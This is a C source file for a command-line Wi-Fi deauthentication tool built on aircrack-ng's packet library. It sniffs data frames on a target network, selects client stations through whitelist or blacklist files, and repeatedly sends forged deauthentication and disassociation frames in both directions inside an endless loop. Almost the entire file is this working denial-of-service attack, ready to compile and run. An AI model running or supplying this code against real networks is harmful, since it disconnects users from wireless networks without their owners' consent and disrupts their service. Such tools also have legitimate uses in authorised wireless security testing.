#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

#include "aircrack-ng/src/osdep/osdep.h"

#define uchar unsigned char

#define MAX_PACKET_LENGTH 4096
#define MAC_LENGTH 6
#define MAX_MAC_LIST_ENTRIES 256
#define DEFAULT_HOW_MANY_PACKETS_TO_SEND 42

/* XXX: globals... why? Why, globals... why!? */
static struct wif *_wi_in, *_wi_out;

int current_channel = 0;

int with_whitelist = 0;

uchar mac_list[MAX_MAC_LIST_ENTRIES][MAC_LENGTH];           // Whitelist/Blacklist
int mac_list_length = 0;                                    // Actual mac_list length

int verbose = 0;                                            // Verbose output
struct packet
{
    uchar *data;
    int length;
} packet;

int read_packet(uchar *buffer, size_t buffer_size)
{
    struct wif *wi = _wi_in; /* XXX */
    int packet_length;

    packet_length = wi_read(wi, buffer, buffer_size, NULL);

    if (packet_length == -1)
    {
        switch (errno)
        {
        case EAGAIN:
            return 0;
        }

        perror("wi_read()");
        return -1;
    }

    return packet_length;
}

void print_mac(const uchar* mac) {
    int i;
    for (i = 0; i < MAC_LENGTH; i++)
    {
        if (i > 0) printf(":");
        printf("%02X", mac[i]);
    }
    printf("\n");
}

/* FIXME: should be refactored */
void print_packet(uchar *h80211, int buffer_size)
{
    int i, j;

    printf("        Size: %d, FromDS: %d, ToDS: %d", buffer_size, (h80211[1] & 2) >> 1, (h80211[1] & 1));

    if ((h80211[0] & 0x0C) == 8 && (h80211[1] & 0x40) != 0)
    {
        if ((h80211[27] & 0x20) == 0)
            printf(" (WEP)");
        else
            printf(" (WPA)");
    }

    for (i = 0; i < buffer_size; i++)
    {
        if ((i & 15) == 0)
        {
            if (i == 224)
            {
                printf("\n        --- CUT ---");
                break;
            }

            printf("\n        0x%04x:  ", i);
        }

        printf("%02x", h80211[i]);

        if ((i & 1) != 0)
            printf(" ");

        if (i == buffer_size - 1 && ((i + 1) & 15) != 0)
        {
            for (j = ((i + 1) & 15); j < 16; j++)
            {
                printf("  ");
                if ((j & 1) != 0)
                    printf(" ");
            }

            printf(" ");

            for (j = 16 - ((i + 1) & 15); j < 16; j++)
            {
                printf(
                    "%c",
                    (h80211[i - 15 + j] <  32 || h80211[i - 15 + j] > 126) ?
                        '.' : h80211[i - 15 + j]
                );
            }
        }

        if (i > 0 && ((i + 1) & 15) == 0)
        {
            printf(" ");

            for (j = 0; j < 16; j++)
            {
                printf(
                    "%c",
                    (h80211[i - 15 + j] <  32 || h80211[i - 15 + j] > 127) ?
                        '.' : h80211[i - 15 + j]
                );
            }
        }
    }

    printf("\n");
}

struct packet create_deauth_frame(uchar *mac_destination, uchar *mac_source, uchar *mac_bssid, int disassoc)
{
    // Generating deauthentication or disassociation frame
    // with unspecified reason.
    struct packet result_packet;
    uchar packet_data[MAX_PACKET_LENGTH];
                                     //Destination           //Source
    char *header =  "\xc0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    //BSSID                  //SEQ //REASON
                    "\x00\x00\x00\x00\x00\x00\x70\x6a\x01\x00";

    memcpy(packet_data, header, 25);
    if (disassoc)
    {
        packet_data[0] = '\xa0';
    }
    // Set target Dest, Src, BSSID
    memcpy(packet_data + 4, mac_destination, MAC_LENGTH);
    memcpy(packet_data + 10, mac_source, MAC_LENGTH);
    memcpy(packet_data + 16, mac_bssid, MAC_LENGTH);

    result_packet.length = 26;
    result_packet.data = packet_data;
    printf("\n----- create_deauth_frame -----\n");
    printf("is_disassociation_frame: %d", disassoc);
    printf("mac_destination: ");
    print_mac(mac_destination);
    printf("mac_source: ");
    print_mac(mac_source);
    printf("mac_bssid: ");
    print_mac(mac_bssid);
    printf("\n-------------------------------\n");
    return result_packet;
}

int send_packet(uchar *buf, size_t count)
{
    printf("\nsending packet...");
    struct wif *wi = _wi_out; /* XXX */
    uchar* to_send = malloc(count);
    memcpy(to_send, buf, count);
    if (wi_write(wi, to_send, count, NULL) == -1) {
        switch (errno) {
        case EAGAIN:
        case ENOBUFS:
            usleep(10000);

            free(to_send);

            return 0;
        }
        perror("wi_write()");

        free(to_send);
        return -1;
    }

    free(to_send);
    printf("... DONE\n");
    if (verbose)
    {
        printf("The sended packet itself: \n");
        print_packet(buf, count);
    }
    return 0;
}


//Returns pointer to the desired MAC Adresses inside a packet
//Type: s => Station
//      a => Access Point
//      b => BSSID
// http://www.aircrack-ng.org/doku.php?id=wds
uchar *get_macs_from_packet(char type, uchar *packet)
{
    uchar *bssid, *station, *access_point;

    bssid = packet + 16;
    station = packet + 10;
    access_point = packet + 4;

    switch (type)
    {
    case 's':
        return station;
    case 'a':
        return access_point;
    case 'b':
        return bssid;
    }

    return NULL;
}

// Convert hexadecimal input into a byte
char hex_to_char(char byte1, char byte2)
{
    char result;

    if (byte1 == '0') { result = 0; }
    if (byte1 == '1') { result = 16; }
    if (byte1 == '2') { result = 32; }
    if (byte1 == '3') { result = 48; }
    if (byte1 == '4') { result = 64; }
    if (byte1 == '5') { result = 80; }
    if (byte1 == '6') { result = 96; }
    if (byte1 == '7') { result = 112; }
    if (byte1 == '8') { result = 128; }
    if (byte1 == '9') { result = 144; }
    if (byte1 == 'A' || byte1 == 'a') { result = 160; }
    if (byte1 == 'B' || byte1 == 'b') { result = 176; }
    if (byte1 == 'C' || byte1 == 'c') { result = 192; }
    if (byte1 == 'D' || byte1 == 'd') { result = 208; }
    if (byte1 == 'E' || byte1 == 'e') { result = 224; }
    if (byte1 == 'F' || byte1 == 'f') { result = 240; }

    if (byte2 == '0') { result += 0; }
    if (byte2 == '1') { result += 1; }
    if (byte2 == '2') { result += 2; }
    if (byte2 == '3') { result += 3; }
    if (byte2 == '4') { result += 4; }
    if (byte2 == '5') { result += 5; }
    if (byte2 == '6') { result += 6; }
    if (byte2 == '7') { result += 7; }
    if (byte2 == '8') { result += 8; }
    if (byte2 == '9') { result += 9; }
    if (byte2 == 'A' || byte2 == 'a') { result += 10; }
    if (byte2 == 'B' || byte2 == 'b') { result += 11; }
    if (byte2 == 'C' || byte2 == 'c') { result += 12; }
    if (byte2 == 'D' || byte2 == 'd') { result += 13; }
    if (byte2 == 'E' || byte2 == 'e') { result += 14; }
    if (byte2 == 'F' || byte2 == 'f') { result += 15; }

    return result;
}

// Parsing input MAC adresses like 00:00:11:22:aa:BB or 00001122aAbB
uchar *parse_mac(const uchar *input)
{
    uchar tmp[12] = "000000000000";
    uchar *mac_parsed = malloc(MAC_LENGTH);
    int t;

    if (input[2] == ':')
    {
        memcpy(tmp, input, 2);
        memcpy(tmp + 2, input + 3, 2);
        memcpy(tmp + 4, input + 6, 2);
        memcpy(tmp + 6, input + 9, 2);
        memcpy(tmp + 8, input + 12, 2);
        memcpy(tmp + 10, input + 15, 2);
    }
    else
    {
        memcpy(tmp, input, 12);
    }

    for (t = 0; t < MAC_LENGTH; t++)
    {
        mac_parsed[t] = hex_to_char(tmp[2*t], tmp[2*t+1]);
    }

    return mac_parsed;
}

void set_channel(int channel)
{
    printf("Setting channel to %d", channel);
    wi_set_channel(_wi_in, channel);
    current_channel = channel;
}

int get_channel()
{
    return current_channel;
}

// Read mac from file
// New line removed
uchar *read_mac_from_file(FILE *file)
{
    int max_length = 255;
    int length = 32;
    char *line = NULL;
    char *mac = NULL;
    size_t allocated = 0;
    int line_length = 0;

    line_length = getline(&line, &allocated, file);
    if (line_length == -1)
    {
        return NULL;
    }

    if (line_length > max_length)
    {
        mac = malloc(max_length + 1);
        memcpy(mac, line, max_length);
        mac[max_length + 1] = '\x00';
        length = strlen((const char*) mac);
    }
    else
    {
        mac = malloc(length);
        memcpy(mac, line, length);
    }

    free(line);
    mac[length - 1] = '\x00';

    return (uchar *) mac;
}

void load_list_file(const char *filename)
{
    FILE *file;                     // File containing MACs list
    uchar *mac;
    uchar *raw_mac;
    mac_list_length = 0;

    /* open file for input */
    if ((file = fopen(filename, "r")) == NULL)
    {
        printf("Cannot open file \n");
        exit(1);
    }

    while ((raw_mac = read_mac_from_file(file)))
    {
        mac = parse_mac(raw_mac);
        memcpy(mac_list[mac_list_length], mac, MAC_LENGTH);
        mac_list_length++;

        free(raw_mac);
        free(mac);

        if ((unsigned int) mac_list_length >= sizeof (mac_list) / sizeof (mac_list[0]))
        {
            fprintf(stderr, "Exceeded max with_whitelist entries\n");
            exit(1);
        }
    }

    fclose(file);
}

int is_in_list(uchar *mac)
{
    int t;

    for (t = 0; t < mac_list_length; t++)
    {
        if (!memcmp(mac_list[t], mac, MAC_LENGTH))
            return 1;
    }

    return 0;
}

/* Sniffing Functions */
uchar *get_target_deauth(uchar *bssid)
{
    uchar *sniffed_packet = malloc(sizeof(uchar[MAX_PACKET_LENGTH]));
    // Sniffing for data frames to find targets
    int packet_length = 0;
    while (1)
    {
        packet_length = 0;
        do {

            packet_length = read_packet(sniffed_packet, MAX_PACKET_LENGTH);

            if (!memcmp(bssid, get_macs_from_packet('b', sniffed_packet), MAC_LENGTH))
            {
                break;
            }

        } while(packet_length < 22);

        // \x08 - Data, \x88 - QoS Data
        if (!memcmp(sniffed_packet, "\x08", 1) || !memcmp(sniffed_packet, "\x88", 1))
        {
            return sniffed_packet;
        }
    }
}

void run_deauth(uchar *bssid, int how_many)
{
    uchar * sniffed_packet_data = NULL;
    uchar * mac_bssid = NULL;
    uchar * mac_station = NULL;
    struct packet result_packet;
    int counter = 0;
    while(1)
    {
        sniffed_packet_data = get_target_deauth(bssid);
        mac_station = get_macs_from_packet('s', sniffed_packet_data);
        mac_bssid = get_macs_from_packet('b', sniffed_packet_data);

        if (
            (with_whitelist == 1 && is_in_list(mac_station)) ||
            (with_whitelist == 0 && !is_in_list(mac_station))
        ) {
            continue;
        }
        break;
    }
    printf("\n\n================[NEW PACKET OF INTEREST CAPTURED]================\n\n");
    printf("Expected BSSID: ");
    print_mac(bssid);
    printf("\n---- Frame ----\n");
    printf("BSSID: ");
    print_mac(mac_bssid);
    printf("mac_station: ");
    print_mac(mac_station);
    printf("mac_station is ");
    if  (with_whitelist)
    {
        printf("not in whitelist.");
    }
    else
    {
        printf("in blacklist.");
    }
    if (verbose)
    {
        printf("The captured packet itself: \n");
        print_packet(sniffed_packet_data, MAX_PACKET_LENGTH);
    }

    // dissasoc router -> station
    result_packet = create_deauth_frame(mac_station, mac_bssid, mac_bssid, 1);
    for (counter = 0; counter < how_many; counter++)
        send_packet(result_packet.data, result_packet.length);
    // deauth router -> station
    result_packet = create_deauth_frame(mac_station, mac_bssid, mac_bssid, 0);
    for (counter = 0; counter < how_many; counter++)
        send_packet(result_packet.data, result_packet.length);
    // dissasoc station -> router
    result_packet = create_deauth_frame(mac_bssid, mac_station, mac_bssid, 1);
    for (counter = 0; counter < how_many; counter++)
        send_packet(result_packet.data, result_packet.length);
    // deauth station -> router
    result_packet = create_deauth_frame(mac_bssid, mac_station, mac_bssid, 0);
    for (counter = 0; counter < how_many; counter++)
        send_packet(result_packet.data, result_packet.length);

    free(sniffed_packet_data);
}

void print_help()
{
    printf(
        "dw <interface> <bssid> [option]        \n"
        "Specify at least on of -w or -b options\n"
        "Options:                               \n"
        " -c <channel>                          \n"
        "   Channel - specify this only if you  \n"
        "    are not currently connected to the \n"
        "    network.                           \n"
        " -w <filename>                         \n"
        "   Whitelist with clients that should  \n"
        "    NOT be deauthenticated.            \n"
        " -b <filename>                         \n"
        "   Blacklist with clients that should  \n"
        "    deauthenticated.                   \n"
        " -p <num>                              \n"
        "   How many packets to send            \n"
        "   Default 42.                         \n"
        " -v                                    \n"
        "   Verbose output. Prints packets.     \n"
    );
}

int main(int argc, const char *argv[])
{
    uchar *bssid;
    int channel = 0, t, how_many = DEFAULT_HOW_MANY_PACKETS_TO_SEND;
    const char *list_file = NULL;

    if (geteuid() != 0)
    {
        printf("This program requires root privileges.\n");
        return 1;
    }

    if (argc < 3 || !memcmp(argv[1], "--help", 6) || !memcmp(argv[1], "-h", 2))
    {
        print_help();
        return 0;
    }

    bssid = parse_mac((const uchar*) argv[2]);

    for (t = 3; t < argc; t++)
    {
        if (!strcmp(argv[t], "-w") && argc >= t+1)
        {
            with_whitelist = 1;
            list_file = argv[++t];
            load_list_file(list_file);
        }
        else if (!strcmp(argv[t], "-b") && argc >= t+1)
        {
            with_whitelist = 2;
            list_file = argv[++t];
            load_list_file(list_file);
        }
        else if (!strcmp(argv[t], "-c") && argc >= t+1)
        {
            channel = atoi(argv[++t]);
            if (channel > 0 && channel < 14)
            {
                set_channel(channel);
            }
            else
            {
                print_help();
                return 1;
            }
        }
        else if (!strcmp(argv[t], "-p") && argc >= t+1)
        {
            how_many = atoi(argv[++t]);
            if (how_many < 0 || how_many > 256)
            {
                printf("\nNumber of packets shoul be between 0 and 256.\n");
                how_many = DEFAULT_HOW_MANY_PACKETS_TO_SEND;
            }
        }
        else if (!strcmp(argv[t], "-h") || !strcmp(argv[t], "--help"))
        {
            print_help();
            return 0;
        }
        else if (!strcmp(argv[t], "-v"))
        {
            verbose = 1;
        }
        else
        {
            printf("\nUnknown option %s \n", argv[t]);
            print_help();
            return 1;
        }
    }

    if (with_whitelist)
    {
        if (with_whitelist == 2) {
            with_whitelist = 0;
        }
    }
    else
    {
        print_help();
        return 1;
    }

    /* open the replay interface */
    _wi_out = wi_open((char*) argv[1]);
    if (!_wi_out)
        return 1;

    /* open the packet source */
    _wi_in = _wi_out;

    /* drop privileges */
    setuid(getuid());

    if (with_whitelist == 1)
    {
        printf("with_whitelist:\n");
    }
    else
    {
        printf("blacklist:\n");
    }
    if (verbose)
    {
        printf("---- Loaded list ----\n");
        printf("Type: ");
        if (with_whitelist)
        {
            printf("whitelist.\n");
        }
        else
        {
            printf("blacklist.\n");
        }
        printf("MACs:\n");
        int i = 0;
        for (i = 0; i < mac_list_length; i++)
        {
            print_mac(mac_list[i]);
        }
        printf("---------------------\n");
    }
    /* Run Forest, run... */
    while (1)
    {
        run_deauth(bssid, how_many);
        /* we shall print some statistics */
    }

    free(bssid);

    return 0;
}
